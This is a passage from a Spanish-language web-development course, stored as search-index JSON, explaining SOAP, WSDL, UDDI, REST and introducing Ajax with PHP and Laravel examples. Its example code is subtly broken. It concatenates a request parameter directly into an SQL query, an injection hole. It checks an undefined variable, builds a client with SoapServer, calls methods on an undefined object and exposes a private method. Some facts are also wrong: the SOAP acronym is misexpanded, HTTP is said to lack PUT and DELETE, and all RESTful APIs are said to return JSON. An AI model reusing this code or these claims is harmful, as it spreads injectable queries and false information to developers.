    "content": ". | 6.1. ¿Qué es un servicio web? . | 6.1.1. Una definición de servicio web | 6.1.2. Diferencias entre servicios web y aplicaciones web | . | 6.2. SOAP . | 6.2.1. La pila de protocolos de SOAP | 6.2.2. Los protocolos SOAP y WSDL | 6.2.3. UDDI | . | 6.3. REST . | 6.3.1. ¿Qué es REST? | 6.3.2. Las 7 operaciones REST | 6.3.3. Los verbos http: GET, POST, PUT, PATCH y DELETE | 6.3.4. El problema de PUT, PATCH y DELETE | 6.3.5. REST y RESTful: ¿hay alguna diferencia? | 6.3.6. REST vs SOAP | 6.3.7. Algunos trucos para implementar un servidor REST | . | . Los servicios web son un tipo particular de aplicación web: una aplicación pensada no solo para ser usada por usuarios humanos, sino por otras aplicaciones. Existen dos estándares para crear servicios web. En este tema, vamos a estudiar esos dos estándares y a ver cómo podemos construir una aplicación de este tipo. ",
    "url": "https://iescelia.org/docs/dwes/_site/servicios-web/#6-servicios-web",
    "relUrl": "/servicios-web/#6-servicios-web"
  },"46": {
    "doc": "6 Servicios web",
    "title": "6.1. ¿Qué es un servicio web?",
    "content": "6.1.1. Una definición de servicio web . Un servicio web es una aplicación web capaz de comunicarse e intercambiar información con otra aplicación (que denominaremos cliente) independientemente de la plataforma en la que cada una se ejecute. Es decir, el servicio web puede estar programado en PHP y correr bajo un sistema operativo GNU/Linux y el cliente puede estar programado con C# y correr bajo un Windows, y deberían ser capaces de comunicarse y trabajar juntas. Pero es importante que quede claro que, en este caso, la aplicación web (servidor) y la aplicación cliente son dos aplicaciones diferentes. Los mensajes que las aplicaciones se intercambian generalmente tienen formato XML o JSON. Existen dos estándares principales en la industria para implementar servicios web, denominados SOAP y REST. A lo largo el tema, vamos a aprender cómo funciona cada uno de ellos. 6.1.2. Diferencias entre servicios web y aplicaciones web . Llegados a este punto, puede que estés pensando: “Vale, pero ¿en qué se diferencia todo esto de una aplicación web MVC? ¿No intercambian también el cliente y el servidor información independientemente de la plataforma en la que se ejecuta cada uno?”. Pues sí, pero hay algunas diferencias fundamentales entre un servicio web y una aplicación web: . | Una aplicación web está diseñada para que un ser humano interactúe con ella a través de un interfaz DHTML. Un servicio web, en cambio, está pensado para que lo use otra aplicación informática (el cliente), no necesariamente un ser humano. | Por ese motivo, los servicios web suelen carecer de interfaz de usuario y no producen salidas HTML legibles. Es decir, un servicio web puro no suele tener vistas. | En cambio, los servicios web suelen producir salidas XML o JSON, pensadas para que los clientes las procesen. Una aplicación web, en cambio, solo responde con XML o JSON cuando recibe una petición Ajax, algo que veremos en el tema siguiente. | . Por lo demás, un servicio web puede tener una arquitectura aproximadamente MVC, y digo aproximadamente porque el servicio web, como acabo de contarte, carece de vistas. Pero puede seguir conservando sus controladores y sus modelos. Los controladores se encargarán de convertir los datos de los modelos a JSON o XML y devolverlos al cliente. ",
    "url": "https://iescelia.org/docs/dwes/_site/servicios-web/#61-qu%C3%A9-es-un-servicio-web",
    "relUrl": "/servicios-web/#61-qué-es-un-servicio-web"
  },"47": {
    "doc": "6 Servicios web",
    "title": "6.2. SOAP",
    "content": "SOAP (Single Object Access Protocol) es un mecanismo estandarizado para la implementación, descripción y publicación de servicios en red. SOAP establece el modo en el que deben comportarse el cliente y el servidor para hablar entre sí, así como la forma en la que el servidor debe dar a conocer sus servicios. 6.2.1. La pila de protocolos de SOAP . El estándar SOAP define una serie de protocolos de niveles de abstracción crecientes. Esta colección de protocolos suele denominarse pila de protocolos SOAP, y son los siguientes: . | Nivel de abstracción | Protocolo | . | Nivel de descubrimiento | UDDI | . | Nivel de publicación | UDDI | . | Nivel de descripción | WSDL | . | Nivel de mensajería | SOAP | . | Nivel de red | TCP, SMTP, FTP, etc | . Como ves, SOAP solo es uno de los protocolos de la pila, aunque todo el tinglado recibe el nombre “SOAP” por extensión. Vamos a explicar brevemente en qué consiste cada protocolo de la pila, y lo vamos a hacer, como en otras ocasiones, por medio de unos ejemplos en lugar de perdernos en largas y farragosas explicaciones. 6.2.2. Los protocolos SOAP y WSDL . Para entender cómo funciona el protocolo SOAP (el más importante de la pila, como ya te habrás imaginado por su nombre) y, en menor medida, el protocolo WSDL, vamos a implementar tres ejemplos de servicios web muy sencillos: . | En el primero veremos cómo construir un servidor que devuelva colecciones de datos en forma de array. | En el segundo veremos cómo puede un servidor devolver datos con estructura más compleja formateados con JSON. | En el tercero montaremos un pequeño servidor con WSDL. | . Ejemplo 1: Consulta de una BD de marcas y modelos de coches . Vamos a programar un servicio web muy simple capaz de servir a los clientes que nos lo pidan un listado de las marcas de coches que existen y otro con los modelos registrados que pertenecen a una marca en concreto. El servidor, por lo tanto, necesita dos funciones: . | obtenerMarcas | obtenerModelos($idMarca) | . Aquí ya se ve la primera diferencia con REST: ni los nombres de los métodos están estandarizados, ni hay una colección de métodos predefinidos para cada tipo de recurso. Cuando veamos REST en el siguiente apartado, entenderás mejor qué significa esta afirmación. El cliente, como es lógico, debe conocer cómo utilizar el servidor. Esto puede hacerse mediante el protocolo WSDL (que ya veremos un poco después) o por otras vías más tradicionales: documentación de la API, guía del desarrollador, manual de usuario… . En estos ejemplos, tanto el servidor como el cliente estarán escritos en PHP. Por supuesto, puede usarse cualquier otro lenguaje para ello, en particular en el lado del cliente. Para saber cómo hacer un cliente SOAP en otros lenguajes, consulta la documentación de tu lenguaje preferido. EN EL LADO DEL SERVIDOR necesitaremos crear un objeto de tipo SoapServer y definir los métodos a los que el servidor va a responder. La clase SoapServer forma parte de la biblioteca de clases estándar de PHP y debería estar disponible en tu servidor a partir de PHP5. Vamos a empezar por los métodos. Crearemos un fichero (por ejemplo, llamado GestionAutomoviles.class.php) en cuyo interior escribiremos una clase con los métodos que necesitemos. Para nuestro ejemplo de marcas y modelos de coches, podría ser algo así: . class GestionAutomoviles { public function obtenerMarcas() { $db = new mysqli(&lt;datos-de-la-conexión&gt;); $marcas = array(); if( $db ) { $result = $db-&gt;query('select id, marca from marcas'); while( $row = $result-&gt;fetch_array() ) $marcas[$row['id']] = $row['marca']; $db-&gt;close(); } return $marcas; } public function obtenerModelos($idMarca) { $db = new mysqli(&lt;datos-de-la-conexión&gt;); $modelos = array(); if( $marca !== 0 ) { $result = $db-&gt;query('select id, modelo from modelos where marca = ' . $idMarca ); while( $row = $result-&gt;fetch_array() ) $modelos[$row['id']] = $row['modelo']; } $db-&gt;close(); return $modelos; } } . Ahora, en otro archivo aparte que llamaremos, por ejemplo, webservice.php, registramos el servicio usando la clase SoapServer de PHP y asignándole la clase anterior, GestionAutomoviles. Se hace así: . &lt;?php include 'GestionAutomoviles.class.php'; $soap = new SoapServer(null, array('uri' =&gt; 'http://localhost/')); $soap-&gt;setClass('GestionAutomoviles'); $soap-&gt;handle(); ?&gt; . Si observas el constructor de SoapServer verás que tiene dos argumentos: . | El fichero WSDL donde se describe el servicio. Como aún no vamos a usar fichero WSDL, ese argumento lo dejaremos a null por ahora. | La URI donde el servidor va a estar escuchando. Puede ser el directorio raíz de nuestro servidor o cualquier subdirectorio o archivo. En el ejemplo, hemos puesto simplemente localhost, pero tú tendrás que adaptarlo a tu servidor. | . EN EL LADO DEL CLIENTE: para comprobar que nuestro servidor SOAP funciona bien, necesitamos crear un secillo cliente que consuma ese servicio. Como hemos dicho antes, esta parte también la vamos a programar en PHP, aunque podría hacerse en cualquier otro lenguaje con soporte SOAP. Necesitamos crear un objeto de tipo SoapClient: . $soapS = new SoapServer(null, \"URI del servidor\"); . Nuevamente, el primer argumento del constructor es el fichero WSDL. Como aún no trabajamos con ellos, lo dejamos a null. Si tuviéramos fichero WSDL, no necesitaríamos indicar la URI del servidor, porque el propio fichero WSDL lo establecería de forma inequívoca. Una vez hecho eso, podemos consumir los servicios del cliente. Por ejemplo: . &lt;?php $client = new SoapClient(null, array('uri' =&gt; 'http://localhost/', 'location' =&gt; 'http://localhost/&lt;ruta&gt;/webservice.php')); $marcas = $client-&gt;obtenerMarcas(); foreach($marcas as $key =&gt; $value ) echo $value; ?&gt; . Fíjate en la manera en la que hemos indicado la localización del servidor: en un array, le decimos a SoapClient su ubicación y la ruta de acceso al fichero que maneja el servicio (en nuestro ejemplo, webservice.php). Ejemplo 2: Lista de libros de una biblioteca. El ejemplo anterior funciona porque tanto cliente como servidor trabajan en PHP. Pero si el cliente no fuera PHP, podría tener problemas al recibir los datos de respuesta del servidor, que son arrays PHP. Lo más adecuado cuando se responden datos complejos es enviarlos en algún formato estándar de intercambio de información, como XML o JSON. En este nuevo ejemplo, vamos a crear un servidor que nos devuelva la lista de libros de una biblioteca (lo que incluirá el id, el título y el ISBN de cada libro) empaquetada en un string JSON. De momento, tampoco usaremos WSDL (fichero de descripción del servicio). LADO DEL SERVIDOR . Definimos los métodos de nuestro servidor (archivo libros.class.php). En este ejemplo, solo habrá un método : . class libros { private function getLibrosJSON() { $sql = \"SELECT * FROM libros\"; $db = new dbAbstract(); // Suponemos que existe una capa // de abstracción de datos return json_encode($db-&gt;consulta($sql)); } ...aquí irían más métodos que pudiera tener el servidor } . Después, registramos el servidor (archivo libros.server.php): . &lt;?php include 'libros.class.php'; $soap = new SoapServer(null, array('uri' =&gt; 'http://localhost/')); $soap-&gt;setClass('libros'); $soap-&gt;handle(); ?&gt; . LADO DEL CLIENTE . De nuevo, lo vamos a crear en PHP, que es el lenguaje con el que estamos trabajando, pero podrías programarlo con cualquier otro lenguaje de programación de tu elección. &lt;?php $client = new SoapClient(null, array('uri' =&gt; 'http://localhost/', 'location' =&gt; 'http://localhost/libros.server.php')); $listaLibros = $libros-&gt;getLibrosJSON(); ?&gt; . A partir de ahí, el cliente dispondrá en la variable $listaLibros de la información recibida del servidor (id, titulo, isbn de todos los libros) empaquetada en formato JSON. Ejemplo 3: Servicio de calculadora . Este será un servicio mucho más simple y hasta un poco tontorrón, pero no te lo tomes a mal: solo es un ejemplo. El servicio simple y tontorrón proporcionará dos métodos: . | sumar (op1, op2) –&gt; Devuelve la suma de op1 y op2 | restar (op1, op2) –&gt; Devuelve la diferencia entre op1 y op2 | . Y va a ser un servicio muy simple y tontorrón porque, ahora sí, usaremos WSDL para definir el servicio y que los clientes sepan cómo usarlo. Así será más fácil que entiendas la estructura de estos ficheros, que no son nada fáciles de entender porque no están escritos para que los lean personas, sino otros programas. LADO DEL SERVIDOR . El código de este servidor es extremadamente simple. Fíjate en que ahora, el crear el objeto SoapServer, sí indicamos el nombre del archivo WSDL (calculadora.wsdl): . &lt;?php $server = new SoapServer(\"calculadora.wsdl\"); function sumar($operando1,$operando2){ return $operando1 + $operando2; } function restar($operando1,$operando2){ return $operando1 - $operando2; } $server-&gt;AddFunction(\"sumar\"); $server-&gt;AddFunction(\"restar\"); $server-&gt;handle(); ?&gt; . LADO DEL CLIENTE . El cliente lo volveremos a programar en PHP, aunque ya sabes que puedes programarlo en cualquier otro lenguaje. Fíjate en que también indicamos el archivo WSDL al crear el objeto SoapClient, y no es necesario informarle de nada más porque el archivo WSDL ya contiene todo lo necesario para que el cliente sepa conectarse al servidor: . &lt;?php $clienteSOAP = new SoapClient('http://ejemplo.com/test/wsdl/calculadora.wsdl'); // Vamos a probar el servidor con un par de llamadas de ejemplo $resultado_suma = $clienteSOAP-&gt;sumar(4.75, 12.5); $resultado_resta = $clienteSOAP-&gt;restar(4.75, 12.5); echo \"La suma es: \" . $resultado_suma . \"&lt;br&gt;\"; echo \"La resta es: \" . $resultado_resta . \"&lt;br&gt;\"; ?&gt; . DOCUMENTO WSDL . El documento WSDL es un archivo de texto alojado en el servidor donde se describen todos los aspectos del servicio: . | Los mensajes que se pueden intercambiar entre el cliente y el servidor. | Los argumentos y tipos de datos de esos mensajes. | Las operaciones y sus tipos | Las rutas donde puede encontrarse el servidor | . Se trata de un documento en formato XML que resulta bastante farragoso de leer, así que tómatelo con calma (ahora entenderás por qué hemos elegido un servicio tan simple como el de este ejemplo para ver su archivo WSDL: si usáramos un servicio más realista, el archivo resultaría un monstruo de miles de líneas). Aquí lo tienes: . &lt;message name=\"calculadoraPeticion\"&gt; &lt;part name=\"operando1\" type=\"xsd:float\" /&gt; &lt;part name=\"operando2\" type=\"xsd:float\" /&gt; &lt;/message&gt; &lt;message name=\"calculadoraRespuesta\"&gt; &lt;part name=\"respuesta\" type=\"xsd:float\" /&gt; &lt;/message&gt; &lt;portType name=\"calculadoraPort\"&gt; &lt;operation name=\"sumar\"&gt; &lt;input message=\"tns:calculadoraPeticion\" /&gt; &lt;output message=\"tns:calculadoraRespuesta\" /&gt; &lt;/operation&gt; &lt;operation name=\"restar\"&gt; &lt;input message=\"tns:calculadoraPeticion\" /&gt; &lt;output message=\"tns:calculadoraRespuesta\" /&gt; &lt;/operation&gt; &lt;/portType&gt; &lt;binding name=\"calculadoraBinding\" type=\"tns:calculadoraPort\"&gt; &lt;soap:binding style=\"rpc\" /&gt; &lt;operation name=\"sumar\"&gt; &lt;soap:operation soapAction=\"urn:calculadora#sumar\" /&gt; &lt;input&gt; &lt;soap:body use=\"encoded\" namespace=\"urn:calculadora\" /&gt; &lt;/input&gt; &lt;output&gt; &lt;soap:body use=\"encoded\" namespace=\"urn:calculadora\" /&gt; &lt;/output&gt; &lt;/operation&gt; &lt;operation name=\"restar\"&gt; &lt;soap:operation soapAction=\"urn:calculadora#restar\" /&gt; &lt;input&gt; &lt;soap:body use=\"encoded\" namespace=\"urn:calculadora\"/&gt; &lt;/input&gt; &lt;output&gt; &lt;soap:body use=\"encoded\" namespace=\"urn:calculadora\"/&gt; &lt;/output&gt; &lt;/operation&gt; &lt;/binding&gt; &lt;service name=\"calculadoraServicio\"&gt; &lt;port name=\"calculadoraPort\" binding=\"tns:calculadoraBinding\"&gt; &lt;soap:address location=\"http://ejemplo.com/test/wsdl/calculadora_server.php\" /&gt; &lt;/port&gt; &lt;/service&gt; . Escribir los documentos WSDL a mano es casi imposible. Y hacerlo sin cometer errores, es imposible del todo. Para eso existen herramientas automatizadas que toman el archivo con la clase que contiene los métodos del servicio y generan automáticamente el archivo WSDL. Puedes encontrar estas herramientas de creación automática del archivo WSDL en cualquier IDE avanzado (como Netbeans o Eclipse) y también en muchos sitios web. Por lo tanto, no es un documento que vayas a tener que redactar tú, ni siquiera que leer tú: se trata de una descripción del servicio escrita por y para programas informáticos. Por eso no tiene un formato demasiado legible para un humano. 6.2.3. UDDI . Este protocolo, que también forma parte de la pila SOAP, es muy fácil de explicar. Olvídate de que existe. Fin de la explicación. Fácil, ¿verdad? . Por si esta explicación te sabe a poco, te diré que UDDI fue un intento de la industria por estandarizar repositorios de servicios, de manera que cualquier cliente pudiera lanzar una petición a la red para descubrirlos y usarlos. Imagina que tienes una web que necesita conocer la previsión del tiempo en una zona, la que sea. Puedes localizar un servicio web que te proporcione esa información (ya sea de forma gratuita o mediante una suscripción, eso es irrelevante). Hay, de hecho, muchos servidores que ofrecen este servicio, empezando por el de la Agencia Estatal de Meteorología de España. Para usar ese servicio, tienes que conocer el servidor que lo ofrece y luego bucear en su API para avieriguar cómo narices debes pedirle la información y en qué formato te la va a devolver. Y, una vez hecho eso, ya estás listo para programar tu cliente y consumir ese servicio. Pues bien: el servicio UDDI buscaba implementar una manera para que el servidor publicara el tipo de servicio que oferta y los clientes pudieran escanear la red en busca de esos servicios, para luego seleccionar uno y lanzar peticiones contra él, todo ello de forma automatizada y transparente al programador. Era una idea interesante, ¿verdad? Pero murió hace mucho. De hecho, entró en punto muerto en el año 2006, cuando Microsoft e IBM decidieron abandonar el proyecto. Así que, lo dicho: aunque en teoría el protocolo UDDI forma parte de la pila SOAP, puedes actuar como si no existiera. ",
    "url": "https://iescelia.org/docs/dwes/_site/servicios-web/#62-soap",
    "relUrl": "/servicios-web/#62-soap"
  },"48": {
    "doc": "6 Servicios web",
    "title": "6.3. REST",
    "content": "6.3.1. ¿Qué es REST? . REST (Representational State Transfer) es un mecanismo de intercambio de información entre clientes y servidores de una red. A diferencia de SOAP, está orientado a los datos, esto eso, proporciona siempre los mismos tipos de acceso a los recursos, sin posibilidad de definir nuevas operaciones. Por esa razón se dice que REST está orientado a los datos mientras que SOAP está orientado a los procesos. Actualmente, gran parte de las APIs, ya sean públicas o privadas, se programan según el diseño REST para que los programadores que las usen sepan qué esperar de la API sin necesidad de consultar farragosas páginas de documentación o de pelearse con el servidor mediante el infalible método de ensayo y error. 6.3.2. Las 7 operaciones REST . Un servidor REST debe implementar siete operaciones de acceso a cada tipo de recurso. Si no las implementa, ya no es REST. Podrá ser aproximadamente REST, pero no REST. Los nombres de las operaciones, los datos que se esperan que se devuelvan y el verbo http de acceso deben respetarse escrupulosamente. Imagina que estamos programando un servidor REST para acceder, por ejemplo, a un recurso llamado Producto dentro de una aplicación más grande (por ejemplo, una tienda online). En la siguiente tabla tienes las siete operaciones que un servidor REST puede realizar con ese recurso, es decir, con los productos de la base de datos. También te indico qué significa cada operación y un ejemplo típico de la URL que permitirá el acceso a través de https. | Operación | Significado | Verbo | URL típica | . | index | Mostrar todos los producto | GET | https://servidor/producto/ | . | show | Mostrar un producto | GET | https://servidor/producto/id | . | create | Mostrar formulario de creación de un producto | GET | https://servidor/producto/create | . | store | Crear un producto con los datos procedentes de un formulario | POST | https://servidor/producto/store | . | edit | Mostrar el formulario de edición de un producto | GET | https://servidor/producto/edit/id | . | update | Actualizar el producto con los datos procedentes del formulario | PUT o PATCH | https://servidor/producto/update/id | . | destroy | Eliminar un producto | DELETE | https://servidor/producto/destroy/id | . Hay una excepción a esta regla: las operaciones create y edit podrían no estar disponibles en algunas APIs REST, cuando estas estén diseñadas para que las usen otras aplicaciones y no seres humanos. Soy consciente de que esta tabla necesita algunas explicaciones adicionales, así que vamos a ello. En primer lugar, ¿qué es eso de los verbos que figura en cada petición? . 6.3.3. Los verbos http: GET, POST, PUT, PATCH y DELETE . El protocolo http define dos tipos de petición al servidor, GET y POST. El estándar REST aumenta estos tipos en otros tres: PUT, PATCH y DELETE. Veamos qué significa exactamente cada uno: . | GET se utiliza para solicitar datos al servidor. Por ejemplo: “Dame toda la información de un producto”. | POST se utiliza para enviar datos al servidor. Por ejemplo: “Aquí tienes toda la información de un producto; anda, almacénalo en tu base de datos”. | PUT/PATCH se utiliza para solicitar al servidor la modificación de datos que ya existen. Por ejemplo: “Este es el nuevo precio de un producto que ya estaba en tu base de datos. Tómalo y actualízalo”. Si se van a actualizar todos los datos de un producto, se utiliza PUT. Si se va a actualizar solo una parte de los datos de un producto, se utiliza PATCH. | DELETE se usa para solicitar la eliminación de datos en el servidor. Por ejemplo: “Elimina este producto”. | . Por ese motivo, en algunas URLs de la tabla anterior enviamos un id como parte de la ruta. Ese id indicará al servidor qué producto le estamos pidiendo que nos busque, modifique o elimine. Una moraleja tal vez imprevista de esta tabla es que nunca deberías enviar datos al servidor mediante GET, puesto que GET solo tendría que usarse para obtener datos del servidor. Otra moraleja es que el propio verbo de la petición http ya contiene información sobre lo que se le está pidiendo hacer al servidor. De hecho, en un servidor REST, contiene información fundamental. Por eso es tan importante respetar las convenciones. Si ya has trabajado con HTML antes, seguro que conocías el significado de GET y POST, pero probablemente nunca habías oído hablar de PUT, PATCH y DELETE, ¿verdad? . 6.3.4. El problema de PUT, PATCH y DELETE . Cuando solicitamos una URL a un servidor sin indicar otra cosa, el protocolo http/https asumirá que se trata de una petición GET. Si en un formulario indicamos que el método de envío de los datos al servidor es POST, los datos que el usuario rellene en ese formulario se enviarán al servidor mediante POST, como parte del paquete http, en una zona especialmente dedicada a empaquetarlos: . &lt;form action='http://servidor/lo-que-sea' method='POST'&gt; ...cuerpo del formulario &lt;/form&gt; . Pero con HTML5 no hay manera de hacer una petición al servidor por PUT, por PATACH o por DELETE. Esto se debe a que la implementación actual de http no contempla los verbos PUT, PATCH ni DELETE. Sin embargo, en el estándar REST estos verbos son fundamentales. Como a nosotros nos interesa construir servidores REST con acceso por http, es decir, vía web, aquí tenemos un grave problema. Mientras llega una nueva implementación de http y/o de HTML, este problema tiene dos soluciones temporales: . | Sustituir las llamadas con PUT, PATCH o DELETE por llamadas POST convencionales. Esto hará que, en la práctica, nuestro servidor deje de ser REST, claro. | Parchear las llamadas con PUT, PATCH o DELETE mediante un campo oculto (de tipo hidden) en el formulario. Esta es la forma en la que se realizan las implementaciones REST vía web en la actualidad. Tienes un ejemplo en este formulario: | . &lt;form action='http://servidor/lo-que-sea' method='POST'&gt; &lt;input type='hidden' name='_method' value='PUT'&gt; ...cuerpo del formulario... &lt;/form&gt; . Tal vez recuerdes que esto es exactamente lo que hace Laravel para implementar llamadas mediante PUT, PATCH o DELETE. ¿Qué dices? ¿Que no te acuerdas? Entonces quizá sea el momento de que retrocedas y repases un poco el enrutador de Laravel. 6.3.5. REST y RESTful: ¿hay alguna diferencia? . Puede que hayas leído en algún sitio esa palabreja: RESTful. ¿Significa lo mismo que REST? ¿Qué diferencia hay? . En realidad, es casi lo mismo: . | REST se refiere a una aplicación web con una arquitectura como la que hemos estado comentando en los epígrafes anteriores. | RESTful se refiere a una API que respeta la arquitectura REST. No una aplicación web, sino una API. Es decir, RESTful se refiere a un servicio web, pensado para responder a otros programas, no a usuarios humanos. | . RESTful y JSON tienen una relación especial: todas las APIs RESTful devuelven sus datos formateados en JSON. Entiéndeme: si a tu servidor le llega una petición de tipo GET a través de una ruta como esta: https://servidor/producto/18, no hay nada que te impida devolver los datos del producto 18 formateados en XML, por ejemplo, pero tienes que ser consciente de que tu API habrá dejado de ser RESTful. El ejemplo típico de servidor RESTful es el que usan las aplicaciones OVA (one-view-application). Estas aplicaciones, una vez cargada la vista principal, hacen toda la comunicación con el servidor mediante Ajax, sin abandonar jamás esa vista. Las aplicaciones OVA lanzan peticiones al servidor y este responde mediante JSON en lugar de con vistas completas. Una aplicación así, en el lado del cliente, se está comportando como un consumidor de servicios y, en el lado del servidor, como una API. Veremos Ajax en el capítulo siguiente y aprenderemos a construir aplicaciones OVA, que son cada vez más frecuentes. En estos casos, el lado del cliente y el lado del servidor actúan como aplicaciones independientes, conectadas solo por la API (aunque la experiencia del usuario sea la de encontrarse ante una única aplicación). Por ese motivo, hay programadores/as que se especializan en desarrollo en el lado del cliente (front-end) y otros que se especializan en desarrollo en el lado del servidor (back-end). Conclusión: si vas a desarrollar una API, es buena idea que sea RESTful. En ese caso, cada vez que tengas que devolver un producto (o lo que sea) formateado en JSON desde tu controlador, es mejor que te olvides de las vistas y te limites a hacer algo así: . public function show($id) { $producto = modelo-de-productos::get($id); // Obtenemos los datos del producto $id pidiéndoselos a nuestro modelo echo json_encode($producto); } . 6.3.6. REST vs SOAP . Ya sabemos en qué consisten las dos grandes arquitecturas para construir servicios web. Ahora, la pregunta del millón: ¿cuál es mejor de las dos? . SOAP es más flexible que REST: permite definir nuevas operaciones sobre los recursos, mientras que REST está limitado a las 7 operaciones predefinidas. REST es mucho más sencillo de usar e implementar que SOAP: las operaciones son bien conocidas y no es necesario describirlas (WSDL) ni publicarlas de ningún modo. Para usar un servidor REST, no hay que estudiarse ninguna API ni pelearse con estructuras de datos desconocidas. Por todo ello, para la mayor parte de las aplicaciones REST es más que suficiente, y de ahí su mayor implantación en la actualidad. 6.3.7. Algunos trucos para implementar un servidor REST . Para implementar un servidor REST (o RESTful, si se trata de una API pura) basta con: . | Crear una arquitectura MVC para los recursos/datos que deseemos servir. Recuerda que, con Laravel, esto se puede conseguir con el comando: . | . $ php artisan make:controller --resource &lt;controlador&gt; . | En lugar de mostrar los recursos en una vista, los devolveremos al cliente mediante JSON con un sencillo echo (recuerda que esa salida la recibirá el cliente, no un ser humano) . Si estamos trabajando con Laravel, en lugar de echo usaremos return al final de cada método del controlador. Laravel se encargará de enviar ese valor devuelto al cliente. | Es importante respetar los nombres de las peticiones HTTP (create, store, edit, update, etc), así como los verbos (GET, POST, PUT, PATCH o DELETE), puesto que serán los que el cliente utilice. | . ",
    "url": "https://iescelia.org/docs/dwes/_site/servicios-web/#63-rest",
    "relUrl": "/servicios-web/#63-rest"
  },"49": {
    "doc": "6 Servicios web",
    "title": "6 Servicios web",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/servicios-web/",
    "relUrl": "/servicios-web/"
  },"50": {
    "doc": "7 Ajax",
    "title": "7. Ajax",
    "content": ". | 7.1. Un poco de introducción al asunto | 7.1.1. ¿Qué es Ajax? . | 7.1.2. Ajax no sirve, en realidad, para nada | 7.1.3. Y, sin embargo, Ajax ha cambiado la forma en la que desarrollamos aplicaciones web | . | 7.2. Cómo enviar peticiones Ajax al servidor con JavaScript clásico . | 7.2.1. Peticiones sin datos al servidor | 7.2.2. Peticiones con datos al servidor (GET) | 7.2.3. Peticiones con datos al servidor (POST) | 7.2.4. Peticiones con datos al servidor (XML) | . | 7.3. Cómo recibir la respuesta del servidor con JavaScript clásico . | 7.3.1. Recepción de datos XML | 7.3.2. Recepción de datos JSON | . | 7.4. Ajax y jQuery . | 7.4.1. Función $.ajax() | 7.4.2. Funciones $.get() y $.post() | 7.4.3. Función $.load() | . | 7.5. Ajax y la API Fetch . | 7.5.1. Promesas de JavaScript | 7.5.2. Lanzando peticiones asíncronas con Fetch | 7.5.3. Lanzar peticiones por POST | . | 7.6. Ajax y Laravel . | 7.6.1. Paso 1. Crear un controlador para las peticiones Ajax | 7.6.2. Paso 2. Crear los métodos del controlador | 7.6.3. Paso 3. Agregar el token CSRF a las peticiones | Ajax, Laravel y Vue.js | . | . ",
    "url": "https://iescelia.org/docs/dwes/_site/ajax/#7-ajax",
    "relUrl": "/ajax/#7-ajax"
  },"51": {
    "doc": "7 Ajax",
    "title": "7.1. Un poco de introducción al asunto",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/ajax/#71-un-poco-de-introducci%C3%B3n-al-asunto",
    "relUrl": "/ajax/#71-un-poco-de-introducción-al-asunto"
  },"52": {
    "doc": "7 Ajax",
    "title": "7.1.1. ¿Qué es Ajax?",
    "content": "Ajax significa Asynchronous Javascript And XML. Qué bien, ¿no? . ¿Y eso qué quiere decir? . Ajax es una tecnología javascript para lanzar y recibir las peticiones al servidor en segundo plano. La página sigue funcionando con normalidad mientras la petición al servidor se resuelve: el usuario puede interactuar con ella y la página responde y no se queda congelada a la espera de que el servidor conteste. Todo eso es lo que significa “de forma asíncrona”. Esta forma de trabajar, que puede parecer una chorrada, se creó para que las páginas dieran la impresión de ser más ágiles de lo que en realidad eran (sobre todo en una época en la que las redes eran más lentas y los servidores podían tardar bastante en responder). En la actualidad, Ajax ha permitido algo que parecía impensable hace una década: que gran parte de la página se ejecute en el cliente y que se pidan al servidor solo los fragmentos de la página que necesitan ser actualizados. Ajax permite actualizar las páginas sin necesidad de recargarlas por completo, lo que mejora la usabilidad y velocidad de respuesta, y cambia radicalmente nuestra forma de programar una aplicación web. 7.1.2. Ajax no sirve, en realidad, para nada . Esa es la pura verdad. Puedes programar una aplicación web completa, compleja y profesional sin hacer una sola petición Ajax. Pero Ajax mejora el rendimiento y la experiencia del usuario. Puedes sustituir unas pocas peticiones convencionales por peticiones Ajax sin cambiar demasiado en tu aplicación. Por ejemplo, para borrar un recurso, puedes lanzar la petición DESTROY por Ajax y actualizar tu vista para eliminar el recurso del documento HTML cuando el servidor responda. Esto es fácil de hacer. Y muy recomendable. Te aconsejo empezar a trastear con Ajax de este modo. 7.1.3. Y, sin embargo, Ajax ha cambiado la forma en la que desarrollamos aplicaciones web . Cómo algo que, en realidad, no sirve para nada ha logrado cambiar la forma en la que desarrollamos aplicaciones web puede parecer un misterio a simple vista, pero existe una razón muy simple para ello y te la cuento ahora mismo. La mayoría de las aplicaciones web se pasan todo el tiempo haciendo lo mismo: accediendo a recursos de una base de datos para consultarlos, crearlos, modificarlos o borrarlos, todo ello mediante interfaces de usuario semejantes. Es decir, el interfaz de usuario para crear, modificar y borrar productos de una base de datos es prácticamente el mismo que el que se usa para crear, modificar y borrar proveedores, por decir algo. Así que alguien se preguntó: ¿por qué estamos programando todo el tiempo lo mismo? . Ajax nos permite hacer algo muy ingenioso para evitar este engorro: diseñar un interfaz de usuario genérico y vacío, solo compuesto por contenedores preparados para nutrirse de datos del servidor. Por ejemplo, podemos diseñar un típico interfaz de usuario HTML que nos muestre una lista de recursos (productos, proveedores, o lo que sea) junto con los botones de “Update” y “Delete”, además de un botón de “Add new”. Pero ese interfaz estará vacío, y mediante Ajax lo cargaremos con productos, con proveedores o con lo que necesitemos. Crearemos el interfaz una vez y lo podemos reutilizar miles de veces, para todo tipo de recursos. Este tipo de aplicaciones, también llamadas SPA (Single-page applications), necesitan una arquitectura algo distinta de la que usamos en las aplicaciones web tradicionales, además de una librería en el lado del cliente para ayudarnos en la creación de contenedores genéricos (librerías como Angular, React o Vue.js). Aunque excede a nuestros propósitos profundizar en estas librerías, veremos algunos fundamentos sobre el uso de Vue.js con Laravel al final de este capítulo. En lo que sigue de este capítulo, aprenderemos los fundamentos de Ajax usándolo de forma puntual en el entorno de una aplicación web convencional con arquitectura MVC, no construyendo una aplicación SPA, que es algo mucho más complejo que, en todo caso, llegará después. ",
    "url": "https://iescelia.org/docs/dwes/_site/ajax/#711-qu%C3%A9-es-ajax",
    "relUrl": "/ajax/#711-qué-es-ajax"
  },"53": {
    "doc": "7 Ajax",
    "title": "7.2. Cómo enviar peticiones Ajax al servidor con JavaScript clásico",
